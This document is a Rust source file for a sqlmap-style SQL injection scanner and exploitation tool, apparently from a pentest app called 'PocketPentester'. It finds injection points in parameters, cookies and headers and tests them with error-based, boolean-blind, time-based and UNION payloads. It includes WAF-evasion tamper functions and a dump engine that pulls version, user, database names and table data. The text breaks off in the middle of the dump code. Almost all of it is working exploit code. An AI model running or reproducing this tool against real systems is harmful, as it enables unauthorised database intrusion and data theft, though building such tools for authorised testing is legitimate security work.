// ===================================================================
// SQLi Scanner — sqlmap-style detection + exploitation.
//
// Detection pipeline (per injection point):
//   1. Heuristic: append `'`, `''`, `"`, `\`, `)` — detect SQL errors or
//      response divergence from baseline. If nothing flags → skip.
//   2. Fingerprint: compile DBMS guess from error signatures.
//   3. Boolean-blind: test TRUE vs FALSE payload with prefix/suffix
//      variants, confirmed when TRUE ≈ baseline AND FALSE ≠ baseline.
//   4. Error-based: send quote-break payload, grep DBMS error regex.
//   5. Time-based: payload that sleeps N seconds, confirm if elapsed ≥ N.
//   6. Union-based: find column count via ORDER BY increments, then
//      UNION SELECT markers to find reflected column → data extraction.
//
// Injection points tested:
//   - GET query params (from URL)
//   - POST body (form-urlencoded or JSON, `*` marker supported)
//   - Cookie values (`*` marker in cookie string)
//   - User-Agent / Referer / X-Forwarded-For headers (level 2+)
//
// `*` marker: anywhere in URL/body/cookie/header value forces that
// position to be the injection point (exclusive). Example:
//   url = "https://x.com/item?id=1*"
//   body = "user=admin&token=*"
//
// After confirmation (if auto_extract=true), attempts to pull:
//   - DBMS banner / version()
//   - current_user / current_database
// via UNION or error-based extraction.
// ===================================================================

use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, Instant};

use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};
use crate::compat::{AppHandle, Emitter};
use tokio::sync::Semaphore;
use url::Url;

// ------------------------------------------------------------------
// Public API
// ------------------------------------------------------------------

#[derive(Debug, Clone, Deserialize)]
pub struct SqliRequest {
    pub url: String,
    #[serde(default = "default_method")]
    pub method: String,
    #[serde(default)]
    pub body: Option<String>,
    #[serde(default)]
    pub headers: HashMap<String, String>,
    #[serde(default)]
    pub cookies: Option<String>,
    /// Filter params to test (optional). Blank = all found params tested.
    #[serde(default)]
    pub params: Option<Vec<String>>,
    /// Which techniques to run: "heuristic" "error" "boolean" "time" "union".
    #[serde(default = "default_techs")]
    pub techniques: Vec<String>,
    /// 1 = safest / fastest, 2 = adds headers + more payloads, 3 = full.
    #[serde(default = "default_level")]
    pub level: u8,
    /// Risk 1 = non-intrusive, 2 = time-based, 3 = stacked queries.
    #[serde(default = "default_risk")]
    pub risk: u8,
    #[serde(default = "default_true")]
    pub stop_on_first: bool,
    #[allow(dead_code)]
    #[serde(default = "default_true")]
    pub auto_extract: bool,
    #[serde(default)]
    pub tamper: Vec<String>,
    #[serde(default = "default_conc")]
    pub concurrency: usize,
    #[serde(default = "default_timeout")]
    pub timeout_ms: u64,
    #[serde(default = "default_true")]
    pub follow_redirects: bool,
}

fn default_method() -> String { "GET".into() }
fn default_techs() -> Vec<String> { vec!["heuristic".into(), "error".into(), "boolean".into(), "union".into(), "time".into()] }
fn default_level() -> u8 { 2 }
fn default_risk() -> u8 { 1 }
fn default_conc() -> usize { 4 }
fn default_timeout() -> u64 { 15_000 }
fn default_true() -> bool { true }

#[derive(Debug, Clone, Serialize)]
pub struct SqliFinding {
    pub param: String,
    pub location: String,            // "GET", "POST", "Cookie", "Header:Referer"
    pub technique: String,           // "heuristic", "error", "boolean-blind", "time-blind", "union"
    pub dbms: Option<String>,
    pub prefix: String,
    pub suffix: String,
    pub payload: String,
    pub full_payload: String,
    pub evidence: String,
    pub confidence: String,
    pub extracted: HashMap<String, String>,
    /// Original request context — used to drive sqli_dump on a confirmed
    /// union finding. Frontend echoes these back.
    pub base_value: String,
    pub union_cols: Option<usize>,
    pub union_position: Option<usize>,
}

// ------------------------------------------------------------------
// DBMS signatures
// ------------------------------------------------------------------

static DBMS_ERRORS: Lazy<Vec<(&'static str, Vec<Regex>)>> = Lazy::new(|| vec![
    ("MySQL", vec![
        Regex::new(r"(?i)sql syntax.*?mysql").unwrap(),
        Regex::new(r"(?i)warning.*?\Wmysqli?_").unwrap(),
        Regex::new(r"(?i)mysql.*?error").unwrap(),
        Regex::new(r"(?i)you have an error in your sql syntax").unwrap(),
        Regex::new(r"(?i)unknown column").unwrap(),
        Regex::new(r"(?i)mysqlclient\.").unwrap(),
        Regex::new(r"(?i)mysql-community-server").unwrap(),
    ]),
    ("PostgreSQL", vec![
        Regex::new(r"(?i)postgresql.*?error").unwrap(),
        Regex::new(r"(?i)pg_query\(\)").unwrap(),
        Regex::new(r"(?i)unterminated quoted string at or near").unwrap(),
        Regex::new(r"(?i)invalid input syntax for (?:integer|type)").unwrap(),
        Regex::new(r"(?i)postgres\.").unwrap(),
    ]),
    ("MSSQL", vec![
        Regex::new(r"(?i)microsoft sql server").unwrap(),
        Regex::new(r"(?i)odbc sql server driver").unwrap(),
        Regex::new(r"(?i)unclosed quotation mark before the character string").unwrap(),
        Regex::new(r"(?i)\[microsoft]\[odbc").unwrap(),
        Regex::new(r"(?i)sqlserver jdbc driver").unwrap(),
        Regex::new(r"(?i)conversion failed when converting").unwrap(),
    ]),
    ("Oracle", vec![
        Regex::new(r"(?i)ora-\d{5}").unwrap(),
        Regex::new(r"(?i)oracle error").unwrap(),
        Regex::new(r"(?i)quoted string not properly terminated").unwrap(),
        Regex::new(r"(?i)oracle.*?driver").unwrap(),
    ]),
    ("SQLite", vec![
        Regex::new(r"(?i)sqlite.*?error").unwrap(),
        Regex::new(r"(?i)sqlite3::sqlexception").unwrap(),
        Regex::new(r"(?i)unrecognized token:").unwrap(),
        Regex::new("(?i)near \".*?\": syntax error").unwrap(),
    ]),
]);

fn hex_literal(s: &str) -> String {
    let mut out = String::from("0x");
    for b in s.as_bytes() {
        out.push_str(&format!("{:02x}", b));
    }
    out
}

/// MySQL CHAR(n,n,...) builds the marker server-side from byte codes.
/// The raw injected payload then never contains the marker's ASCII bytes,
/// so matching the marker in the response body proves the DB actually
/// produced it (not just echoing our URL back).
fn mysql_char_literal(s: &str) -> String {
    let parts: Vec<String> = s.as_bytes().iter().map(|b| b.to_string()).collect();
    format!("CHAR({})", parts.join(","))
}

fn detect_dbms(body: &str) -> Option<&'static str> {
    for (db, regexes) in DBMS_ERRORS.iter() {
        if regexes.iter().any(|re| re.is_match(body)) { return Some(db); }
    }
    None
}

// ------------------------------------------------------------------
// Prefix/suffix combos — ported from sqlmap's boundaries
// ------------------------------------------------------------------

fn boundaries(level: u8) -> Vec<(&'static str, &'static str)> {
    // (prefix, suffix)
    let base = vec![
        ("", "-- -"),
        ("'", "-- -"),
        ("'", "'"),
        ("\"", "-- -"),
        ("\"", "\""),
        (")", "-- -"),
        ("')", "-- -"),
        ("\")", "-- -"),
    ];
    if level <= 1 { return base; }
    let mut more = base;
    more.extend([
        ("))", "-- -"),
        ("'))", "-- -"),
        ("\"))", "-- -"),
        ("`", "-- -"),
        ("`;", "-- -"),
        (";", "-- -"),
        ("';", "-- -"),
    ]);
    if level <= 2 { return more; }
    more.extend([
        ("'))", "AND ('x'='x"),
        ("\"))", "AND (\"x\"=\"x"),
        ("%27", "-- -"),
        ("%2527", "-- -"),
    ]);
    more
}

// ------------------------------------------------------------------
// Tamper scripts (WAF bypass)
// ------------------------------------------------------------------

fn apply_tamper(payload: &str, tampers: &[String]) -> String {
    let mut p = payload.to_string();
    for t in tampers {
        p = match t.as_str() {
            "randomcase" => randomcase(&p),
            "space2comment" => p.replace(' ', "/**/"),
            "space2plus" => p.replace(' ', "+"),
            "between" => p.replace("=", " BETWEEN 0 AND 0 "), // crude
            "equaltolike" => p.replace("=", " LIKE "),
            "charunicodeencode" => char_unicode_encode(&p),
            _ => p,
        };
    }
    p
}

fn randomcase(s: &str) -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    s.chars().map(|c| if c.is_ascii_alphabetic() && rng.gen_bool(0.5) { c.to_ascii_uppercase() } else { c.to_ascii_lowercase() }).collect()
}

fn char_unicode_encode(s: &str) -> String {
    s.chars().map(|c| if c.is_ascii_alphanumeric() { c.to_string() } else { format!("%u00{:02x}", c as u32) }).collect()
}

// ------------------------------------------------------------------
// Request orchestration
// ------------------------------------------------------------------

#[derive(Debug, Clone)]
struct InjectionPoint {
    location: String,    // "GET", "POST", "Cookie", "Header:X-Forwarded-For"
    name: String,        // param name
    base_value: String,  // original value
}

#[derive(Debug, Clone)]
struct Target {
    url: Url,
    method: String,
    body: Option<String>,
    body_is_json: bool,
    headers: HashMap<String, String>,
    cookies: Option<String>,
}

fn parse_cookies(raw: &str) -> Vec<(String, String)> {
    raw.split(';').filter_map(|p| {
        let t = p.trim();
        if t.is_empty() { return None; }
        let (k, v) = t.split_once('=')?;
        Some((k.trim().to_string(), v.trim().to_string()))
    }).collect()
}

fn serialize_cookies(pairs: &[(String, String)]) -> String {
    pairs.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join("; ")
}

fn find_injection_points(req: &SqliRequest, target: &Target) -> Vec<InjectionPoint> {
    let mut out: Vec<InjectionPoint> = Vec::new();
    let filter = req.params.clone().unwrap_or_default();
    let want = |n: &str| filter.is_empty() || filter.iter().any(|f| f == n);

    // Star marker has priority — if present, only inject there
    if target.url.as_str().contains('*') {
        // treat entire URL query as marker-based... simplified: find param with *
        for (k, v) in target.url.query_pairs() {
            if v.contains('*') {
                out.push(InjectionPoint {
                    location: "GET".into(),
                    name: k.to_string(),
                    base_value: v.trim_end_matches('*').to_string(),
                });
            }
        }
        if !out.is_empty() { return out; }
    }

    if let Some(body) = &target.body {
        if body.contains('*') && !target.body_is_json {
            for pair in body.split('&') {
                if let Some((k, v)) = pair.split_once('=') {
                    if v.contains('*') {
                        out.push(InjectionPoint {
                            location: "POST".into(),
                            name: k.to_string(),
                            base_value: v.trim_end_matches('*').to_string(),
                        });
                    }
                }
            }
            if !out.is_empty() { return out; }
        }
    }

    if let Some(ck) = &target.cookies {
        if ck.contains('*') {
            for (k, v) in parse_cookies(ck) {
                if v.contains('*') {
                    out.push(InjectionPoint {
                        location: "Cookie".into(),
                        name: k,
                        base_value: v.trim_end_matches('*').to_string(),
                    });
                }
            }
            if !out.is_empty() { return out; }
        }
    }

    for (k, v) in &target.headers {
        if v.contains('*') {
            out.push(InjectionPoint {
                location: format!("Header:{k}"),
                name: k.clone(),
                base_value: v.trim_end_matches('*').to_string(),
            });
        }
    }
    if !out.is_empty() { return out; }

    // No marker: enumerate every parameter
    for (k, v) in target.url.query_pairs() {
        if want(&k) {
            out.push(InjectionPoint { location: "GET".into(), name: k.into_owned(), base_value: v.into_owned() });
        }
    }
    if let Some(body) = &target.body {
        if !target.body_is_json {
            for pair in body.split('&') {
                if let Some((k, v)) = pair.split_once('=') {
                    if want(k) {
                        out.push(InjectionPoint { location: "POST".into(), name: k.to_string(), base_value: v.to_string() });
                    }
                }
            }
        }
    }
    if let Some(ck) = &target.cookies {
        for (k, v) in parse_cookies(ck) {
            if want(&k) {
                out.push(InjectionPoint { location: "Cookie".into(), name: k, base_value: v });
            }
        }
    }
    if req.level >= 2 {
        let hdr_points = ["User-Agent", "Referer", "X-Forwarded-For"];
        for h in hdr_points {
            if target.headers.contains_key(h) && want(h) {
                out.push(InjectionPoint {
                    location: format!("Header:{h}"),
                    name: h.into(),
                    base_value: target.headers.get(h).cloned().unwrap_or_default(),
                });
            } else if req.level >= 3 && want(h) {
                // inject even if header wasn't sent originally
                out.push(InjectionPoint {
                    location: format!("Header:{h}"),
                    name: h.into(),
                    base_value: String::new(),
                });
            }
        }
    }
    out
}

async fn send(
    client: &reqwest::Client,
    target: &Target,
    point: &InjectionPoint,
    injected_value: &str,
) -> Option<(String, u16, u128)> {
    let start = Instant::now();
    let method = reqwest::Method::from_bytes(target.method.as_bytes()).unwrap_or(reqwest::Method::GET);
    let mut url = target.url.clone();
    let mut body = target.body.clone();
    let mut cookies = target.cookies.clone();
    let mut headers = target.headers.clone();

    match point.location.as_str() {
        "GET" => {
            let pairs: Vec<(String, String)> = url.query_pairs()
                .map(|(k, v)| if k == point.name.as_str() { (k.into_owned(), injected_value.to_string()) }
                               else { (k.into_owned(), v.into_owned()) })
                .collect();
            url.query_pairs_mut().clear();
            for (k, v) in &pairs { url.query_pairs_mut().append_pair(k, v); }
        }
        "POST" => {
            if let Some(b) = &body {
                let out: Vec<String> = b.split('&').map(|pair| {
                    if let Some((k, v)) = pair.split_once('=') {
                        if k == point.name { format!("{k}={}", urlencoding::encode(injected_value)) }
                        else { format!("{k}={v}") }
                    } else { pair.to_string() }
                }).collect();
                body = Some(out.join("&"));
            }
        }
        "Cookie" => {
            if let Some(ck) = &cookies {
                let mut pairs = parse_cookies(ck);
                for p in &mut pairs {
                    if p.0 == point.name { p.1 = injected_value.to_string(); }
                }
                cookies = Some(serialize_cookies(&pairs));
            }
        }
        loc if loc.starts_with("Header:") => {
            headers.insert(point.name.clone(), injected_value.to_string());
        }
        _ => {}
    }

    let mut builder = client.request(method, url.as_str());
    for (k, v) in &headers {
        if k.trim().is_empty() { continue; }
        builder = builder.header(k.trim(), v);
    }
    if let Some(ck) = &cookies { builder = builder.header("Cookie", ck); }
    if let Some(b) = &body {
        if target.body_is_json {
            builder = builder.header("Content-Type", "application/json").body(b.clone());
        } else {
            builder = builder.header("Content-Type", "application/x-www-form-urlencoded").body(b.clone());
        }
    }
    let resp = builder.send().await.ok()?;
    let status = resp.status().as_u16();
    let text = resp.text().await.unwrap_or_default();
    let elapsed = start.elapsed().as_millis();
    Some((text, status, elapsed))
}

// --- content similarity -------------------------------------------

fn content_hash(s: &str) -> u64 {
    // crude content signature: sorted tokens
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut hasher = DefaultHasher::new();
    let mut tokens: Vec<&str> = s.split_whitespace().collect();
    tokens.sort_unstable();
    tokens.hash(&mut hasher);
    hasher.finish()
}

fn similarity(a: &str, b: &str) -> f64 {
    if a == b { return 1.0; }
    if a.is_empty() && b.is_empty() { return 1.0; }
    let al = a.len() as f64;
    let bl = b.len() as f64;
    let len_sim = al.min(bl) / al.max(bl);
    let hash_sim = if content_hash(a) == content_hash(b) { 1.0 } else { 0.0 };
    // weighted
    0.6 * len_sim + 0.4 * hash_sim
}

// ------------------------------------------------------------------
// Detection techniques
// ------------------------------------------------------------------

async fn heuristic_probe(
    client: &reqwest::Client, target: &Target, point: &InjectionPoint,
) -> (bool, Option<&'static str>) {
    // Append quote/bracket and look for DBMS error OR significant response change
    let probes = ["'", "\"", "\\", "')", "\")"];
    for p in probes {
        let val = format!("{}{}", point.base_value, p);
        if let Some((body, _, _)) = send(client, target, point, &val).await {
            if let Some(db) = detect_dbms(&body) { return (true, Some(db)); }
        }
    }
    (false, None)
}

async fn test_error_based(
    client: &reqwest::Client, target: &Target, point: &InjectionPoint, level: u8, tamper: &[String],
) -> Option<(String, String, String, String, &'static str)> {
    // returns (prefix, suffix, payload, evidence, dbms)
    let breakers = ["'", "\"", "')", "\")", "`"];
    for b in breakers {
        for &payload in &["", "AND 1=CAST(@@version AS int)", "AND 1=CONVERT(int, @@version)", "AND extractvalue(1,concat(0x7e,version(),0x7e))"] {
            let full = apply_tamper(&format!("{}{}{} -- -", b, if payload.is_empty() {""} else {" "}, payload), tamper);
            let val = format!("{}{}", point.base_value, full);
            if let Some((body, _, _)) = send(client, target, point, &val).await {
                if let Some(db) = detect_dbms(&body) {
                    return Some((b.to_string(), "-- -".to_string(), payload.to_string(), format!("{db} error triggered"), db));
                }
            }
        }
        if level < 2 { break; }
    }
    None
}

async fn test_boolean_blind(
    client: &reqwest::Client, target: &Target, point: &InjectionPoint, baseline: &str, level: u8, tamper: &[String],
) -> Option<(String, String, String, String)> {
    let boundaries = boundaries(level);
    for (prefix, suffix) in boundaries.iter() {
        let t_payload = apply_tamper(&format!("{}{} AND 1=1{}", point.base_value, prefix, suffix), tamper);
        let f_payload = apply_tamper(&format!("{}{} AND 1=2{}", point.base_value, prefix, suffix), tamper);
        let t_resp = send(client, target, point, &t_payload).await;
        let f_resp = send(client, target, point, &f_payload).await;
        if let (Some((tb, _, _)), Some((fb, _, _))) = (t_resp, f_resp) {
            let sim_t_base = similarity(baseline, &tb);
            let sim_f_base = similarity(baseline, &fb);
            // TRUE should resemble baseline; FALSE should diverge
            if sim_t_base > 0.9 && sim_f_base < 0.8 && (sim_t_base - sim_f_base) > 0.1 {
                return Some((
                    prefix.to_string(),
                    suffix.to_string(),
                    "AND 1=1 / AND 1=2".to_string(),
                    format!("true-sim={:.2} false-sim={:.2} (divergence detected)", sim_t_base, sim_f_base),
                ));
            }
        }
    }
    None
}

async fn test_time_based(
    client: &reqwest::Client, target: &Target, point: &InjectionPoint, level: u8, tamper: &[String],
) -> Option<(String, String, String, String, &'static str)> {
    let cases: &[(&str, &str, u64)] = &[
        ("MySQL", "AND SLEEP(5)", 5),
        ("MySQL", "AND (SELECT 1 FROM (SELECT SLEEP(5))a)", 5),
        ("PostgreSQL", "; SELECT pg_sleep(5)", 5),
        ("MSSQL", "; WAITFOR DELAY '0:0:5'", 5),
        ("Oracle", "AND DBMS_PIPE.RECEIVE_MESSAGE('x',5) IS NOT NULL", 5),
        ("SQLite", "AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))", 5),
    ];
    for (prefix, _suffix) in boundaries(level).iter() {
        for (db, payload, sec) in cases.iter() {
            let full = apply_tamper(&format!("{}{} {}-- -", point.base_value, prefix, payload), tamper);
            if let Some((_, _, elapsed)) = send(client, target, point, &full).await {
                let threshold_ms = (sec * 1000 - 500) as u128;
                if elapsed >= threshold_ms {
                    return Some((
                        prefix.to_string(),
                        "-- -".to_string(),
                        payload.to_string(),
                        format!("response delayed {}ms (payload sleeps {}s)", elapsed, sec),
                        db,
                    ));
                }
            }
        }
    }
    None
}

static ORDER_BY_ERR: Lazy<Regex> = Lazy::new(|| Regex::new(
    r"(?i)(unknown column ['`]?\d+['`]? in ['`]?order|order by position number \d+ is out of range|1st order by term out of range|order by clause is not in select list)"
).unwrap());

async fn test_union_based(
    client: &reqwest::Client, target: &Target, point: &InjectionPoint, level: u8, tamper: &[String],
) -> Option<(String, String, String, String, Option<&'static str>, HashMap<String, String>, usize, usize)> {
    let marker = format!("xpl{:04}mrk", rand::random::<u16>());

    // Baseline: response for a guaranteed-good n=1 after each prefix is
    // recorded and subsequent n's are compared. Relying on generic text
    // like "order by" in the body is unreliable because many apps echo
    // the failing query back.
    let mut cols: usize = 0;
    for (prefix, _suffix) in boundaries(level).iter() {
        // baseline for THIS prefix — ORDER BY 1 should always succeed if
        // the injection is valid at all.
        let base_full = apply_tamper(&format!("{}{} ORDER BY 1-- -", point.base_value, prefix), tamper);
        let (base_body, base_status, _) = match send(client, target, point, &base_full).await {
            Some(v) => v,
            None => continue,
        };
        // If ORDER BY 1 itself errors (this prefix is wrong) — skip.
        if ORDER_BY_ERR.is_match(&base_body) || base_status >= 500 { continue; }

        let mut last_ok: usize = 1;
        for n in 2..=20 {
            let full = apply_tamper(&format!("{}{} ORDER BY {}-- -", point.base_value, prefix, n), tamper);
            if let Some((body, status, _)) = send(client, target, point, &full).await {
                let err = status >= 500
                    || ORDER_BY_ERR.is_match(&body)
                    || similarity(&base_body, &body) < 0.55;
                if err { break; } else { last_ok = n; }
            } else { break; }
        }
        if last_ok > 0 {
            cols = last_ok;
            // Build the marker via CHAR(n,n,...) so the raw injected
            // query never contains the marker's ASCII. Many apps reflect
            // the raw GET/POST param in the page (e.g. `<h1>User #<?=$id?>`),
            // which used to false-positive every column. With CHAR() the
            // marker only appears when the DB actually produced the row.
            let marker_expr = mysql_char_literal(&marker);
            // Step 2: UNION SELECT with NULLs, replace one at a time with marker.
            // Use a non-matching base value to suppress the original row so the
            // UNION row becomes the first (and often only) result the app renders.
            // Try several strategies: numeric negation, AND 1=2, large number.
            let null_bases: Vec<String> = {
                let bv = &point.base_value;
                let mut v = Vec::new();
                // If base looks numeric, try negative and zero
                if bv.chars().all(|c| c.is_ascii_digit()) {
                    v.push(format!("-{}", bv));
                    v.push("0".into());
                    v.push("999999999".into());
                }
                // AND 1=2 works universally to nullify the WHERE clause
                v.push(format!("{} AND 1=2", bv));
                v
            };
            for position in 1..=cols {
                let mut fields: Vec<String> = (1..=cols).map(|i| if i == position {
                    marker_expr.clone()
                } else { "NULL".to_string() }).collect();
                let union_part = format!(" UNION SELECT {}", fields.join(","));
                // Try each null base until marker reflects
                for nb in &null_bases {
                    let full = apply_tamper(&format!("{}{}{}{}", nb, prefix, union_part, "-- -"), tamper);
                    if let Some((body, _, _)) = send(client, target, point, &full).await {
                        if body.contains(&marker) {
                            // injectable column found — extract data with hex-wrapped concat
                            let mut extracted: HashMap<String, String> = HashMap::new();
                            let probes = [
                                ("version", "version()"),
                                ("user", "current_user()"),
                                ("db", "database()"),
                            ];
                            for (name, expr) in probes {
                                fields[position - 1] = format!("CONCAT({m},{e},{m})", m=marker_expr, e=expr);
                                let ep = apply_tamper(&format!("{}{} UNION SELECT {}-- -",
                                    nb, prefix, fields.join(",")), tamper);
                                if let Some((b, _, _)) = send(client, target, point, &ep).await {
                                    let re = Regex::new(&format!("{m}([\\s\\S]+?){m}",
                                        m = regex::escape(&marker))).unwrap();
                                    if let Some(c) = re.captures(&b).and_then(|c| c.get(1)) {
                                        extracted.insert(name.into(), c.as_str().to_string());
                                    }
                                }
                                fields[position - 1] = marker_expr.clone();
                            }
                            let dbms: Option<&'static str> = extracted.get("version").and_then(|v| {
                                let lo = v.to_lowercase();
                                if lo.contains("mariadb") || lo.contains("mysql") { Some("MySQL") }
                                else if lo.contains("postgresql") { Some("PostgreSQL") }
                                else if lo.contains("microsoft sql") { Some("MSSQL") }
                                else { None }
                            });
                            return Some((
                                prefix.to_string(),
                                "-- -".to_string(),
                                format!("UNION SELECT {}", fields.join(",")),
                                format!("union injection at column {position}/{cols}, marker reflected"),
                                dbms,
                                extracted,
                                cols,
                                position,
                            ));
                        }
                    }
                } // end null_bases loop
            }
            break;
        }
    }
    let _ = cols;
    None
}

// ------------------------------------------------------------------
// Orchestrator
// ------------------------------------------------------------------

pub async fn sqli_scan(app: AppHandle, req: SqliRequest) -> Result<Vec<SqliFinding>, String> {
    let url = Url::parse(&req.url).map_err(|e| e.to_string())?;

    let body_is_json = req.headers.iter().any(|(k, v)|
        k.eq_ignore_ascii_case("content-type") && v.to_lowercase().contains("json"));

    let target = Target {
        url,
        method: req.method.clone(),
        body: req.body.clone(),
        body_is_json,
        headers: req.headers.clone(),
        cookies: req.cookies.clone(),
    };

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_millis(req.timeout_ms))
        .redirect(if req.follow_redirects {
            reqwest::redirect::Policy::limited(5)
        } else { reqwest::redirect::Policy::none() })
        .cookie_store(false)
        .user_agent("Mozilla/5.0 (PocketPentester-SQLi)")
        .build()
        .map_err(|e| e.to_string())?;

    let points = find_injection_points(&req, &target);
    if points.is_empty() {
        return Err("no injection points detected — supply params, use * marker, or pass params filter".into());
    }

    let _ = app.emit("sqli:status", format!("{} injection point(s) to test", points.len()));

    // baseline with original values
    let first = points.first().unwrap();
    let baseline = send(&client, &target, first, &first.base_value).await
        .map(|(b, _, _)| b).unwrap_or_default();

    let _sem = Arc::new(Semaphore::new(req.concurrency.max(1)));
    let mut findings: Vec<SqliFinding> = Vec::new();

    for point in &points {
        let _ = app.emit("sqli:status",
            format!("→ testing {} [{}] (base={})", point.location, point.name,
                    if point.base_value.len() > 30 { format!("{}...", &point.base_value[..30]) } else { point.base_value.clone() }));

        let mut dbms_hint: Option<&'static str> = None;

        // heuristic
        if req.techniques.iter().any(|t| t == "heuristic") {
            let (flag, db) = heuristic_probe(&client, &target, point).await;
            if flag {
                dbms_hint = db;
                let _ = app.emit("sqli:status", format!("  heuristic positive{}", db.map(|d| format!(" ({d})")).unwrap_or_default()));
            } else {
                let _ = app.emit("sqli:status", "  heuristic negative, continuing anyway");
            }
        }

        // Track whether this param already confirmed injectable (for stop_on_first).
        // Even if stop_on_first, we still run UNION after the first hit so dump works.
        let mut param_confirmed = false;

        // error-based
        if req.techniques.iter().any(|t| t == "error") {
            if let Some((pre, suf, payload, evidence, db)) =
                test_error_based(&client, &target, point, req.level, &req.tamper).await
            {
                let f = SqliFinding {
                    param: point.name.clone(), location: point.location.clone(),
                    technique: "error-based".into(),
                    dbms: Some(db.to_string()),
                    prefix: pre.clone(), suffix: suf.clone(), payload: payload.clone(),
                    full_payload: format!("{}{}{} {}", point.base_value, pre, payload, suf),
                    evidence, confidence: "HIGH".into(), extracted: HashMap::new(),
                    base_value: point.base_value.clone(),
                    union_cols: None, union_position: None,
                };
                let _ = app.emit("sqli:hit", f.clone());
                findings.push(f);
                param_confirmed = true;
            }
        }

        // boolean-based
        if !param_confirmed && req.techniques.iter().any(|t| t == "boolean") {
            if let Some((pre, suf, payload, evidence)) =
                test_boolean_blind(&client, &target, point, &baseline, req.level, &req.tamper).await
            {
                let f = SqliFinding {
                    param: point.name.clone(), location: point.location.clone(),
                    technique: "boolean-blind".into(),
                    dbms: dbms_hint.map(|s| s.to_string()),
                    prefix: pre.clone(), suffix: suf.clone(), payload: payload.clone(),
                    full_payload: format!("{}{} AND 1=1{}", point.base_value, pre, suf),
                    evidence, confidence: "MEDIUM".into(), extracted: HashMap::new(),
                    base_value: point.base_value.clone(),
                    union_cols: None, union_position: None,
                };
                let _ = app.emit("sqli:hit", f.clone());
                findings.push(f);
                param_confirmed = true;
            }
        }

        // union-based — always attempt if technique enabled, even if param
        // already confirmed. UNION data is needed for the dump engine.
        if req.techniques.iter().any(|t| t == "union") {
            if let Some((pre, suf, payload, evidence, db, extracted, ucols, upos)) =
                test_union_based(&client, &target, point, req.level, &req.tamper).await
            {
                // Backfill union info into earlier findings for this param
                // so the dump panel works without a separate probe step.
                for prev in findings.iter_mut() {
                    if prev.param == point.name && prev.location == point.location
                        && prev.union_cols.is_none()
                    {
                        prev.union_cols = Some(ucols);
                        prev.union_position = Some(upos);
                        if prev.prefix.is_empty() { prev.prefix = pre.clone(); }
                    }
                }
                let f = SqliFinding {
                    param: point.name.clone(), location: point.location.clone(),
                    technique: "union-based".into(),
                    dbms: db.map(|s| s.to_string()).or(dbms_hint.map(|s| s.to_string())),
                    prefix: pre.clone(), suffix: suf.clone(), payload: payload.clone(),
                    full_payload: format!("{}{} {} {}", point.base_value, pre, payload, suf),
                    evidence, confidence: "HIGH".into(), extracted,
                    base_value: point.base_value.clone(),
                    union_cols: Some(ucols), union_position: Some(upos),
                };
                let _ = app.emit("sqli:hit", f.clone());
                findings.push(f);
                param_confirmed = true;
            }
        }

        // time-based (expensive, last) — skip if already confirmed and stop_on_first
        if req.techniques.iter().any(|t| t == "time") && req.risk >= 1
            && !(param_confirmed && req.stop_on_first)
        {
            if let Some((pre, suf, payload, evidence, db)) =
                test_time_based(&client, &target, point, req.level, &req.tamper).await
            {
                let f = SqliFinding {
                    param: point.name.clone(), location: point.location.clone(),
                    technique: "time-blind".into(),
                    dbms: Some(db.to_string()),
                    prefix: pre.clone(), suffix: suf.clone(), payload: payload.clone(),
                    full_payload: format!("{}{} {}{}", point.base_value, pre, payload, suf),
                    evidence, confidence: "HIGH".into(), extracted: HashMap::new(),
                    base_value: point.base_value.clone(),
                    union_cols: None, union_position: None,
                };
                let _ = app.emit("sqli:hit", f.clone());
                findings.push(f);
            }
        }

        // If stop_on_first and this param confirmed, skip remaining params
        if param_confirmed && req.stop_on_first { break; }
    }

    let _ = app.emit("sqli:done", findings.len());
    Ok(findings)
}

// ===================================================================
// Dump engine — drives union-based extraction after a confirmed finding.
//
// Actions: "databases" | "tables" | "columns" | "rows" | "custom"
// DBMS   : "MySQL" | "MariaDB" | "PostgreSQL" | "MSSQL" | "SQLite"
//
// Strategy: build a subquery that returns a single delimited string, wrap
// it in the DBMS-specific concat(marker, subq, marker), then inject into
// the confirmed UNION position. Parse by regex + delimiter split.
//
// Row dumps use U+007F (\x7f) as intra-row delimiter and `|` between rows.
// ===================================================================

#[derive(Debug, Clone, Deserialize)]
pub struct SqliDumpRequest {
    pub url: String,
    #[serde(default = "default_method")]
    pub method: String,
    #[serde(default)]
    pub body: Option<String>,
    #[serde(default)]
    pub headers: HashMap<String, String>,
    #[serde(default)]
    pub cookies: Option<String>,
    // injection context (from a previous finding)
    pub param: String,
    pub location: String,
    pub base_value: String,
    pub prefix: String,
    pub cols: usize,
    pub position: usize,
    pub dbms: String,
    // dump controls
    pub action: String,
    #[serde(default)]
    pub database: Option<String>,
    #[serde(default)]
    pub table: Option<String>,
    #[serde(default)]
    pub columns: Option<Vec<String>>,
    #[serde(default = "default_dump_limit")]
    pub limit: usize,
    #[serde(default)]
    pub offset: usize,
    #[serde(default)]
    pub custom_sql: Option<String>,
    #[serde(default)]
    pub tamper: Vec<String>,
    #[serde(default = "default_timeout")]
    pub timeout_ms: u64,
    #[serde(default = "default_true")]
    pub follow_redirects: bool,
}

fn default_dump_limit() -> usize { 100 }

#[derive(Debug, Clone, Serialize)]
pub struct SqliDumpResult {
    pub dbms: String,
    pub action: String,
    pub headers: Vec<String>,
    pub rows: Vec<Vec<String>>,
    pub count: usize,
    pub truncated: bool,
    pub raw_payload: String,
    pub raw_captured: String,
}

fn normalize_dbms(d: &str) -> &str {
    let lo = d.to_lowercase();
    if lo.contains("maria") || lo.contains("mysql") { "MySQL" }
    else if lo.contains("postgres") { "PostgreSQL" }
    else if lo.contains("mssql") || lo.contains("sql server") { "MSSQL" }
    else if lo.contains("sqlite") { "SQLite" }
    else if lo.contains("oracle") { "Oracle" }
    else { "MySQL" }
}

fn dump_expr(
    dbms: &str, action: &str,
    db: Option<&str>, table: Option<&str>, cols: &[String],
    limit: usize, offset: usize, custom: Option<&str>,
) -> String {
    let d = dbms.to_string();
    match (d.as_str(), action) {
        ("MySQL", "databases") =>
            "(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x7c) FROM information_schema.schemata)".into(),
        ("MySQL", "tables") => {
